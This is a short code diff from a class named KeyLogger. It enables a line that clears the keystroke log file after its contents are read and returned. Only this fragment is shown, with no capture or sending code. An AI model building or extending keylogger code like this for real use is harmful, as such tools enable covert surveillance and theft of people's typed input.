@@ -78,7 +78,7 @@ class KeyLogger:
                     content = f.read()
                 
                 # Clear the file
-                # open(log_file, 'w').close()
+                open(log_file, 'w').close()
                 
                 return content
         except Exception as e:
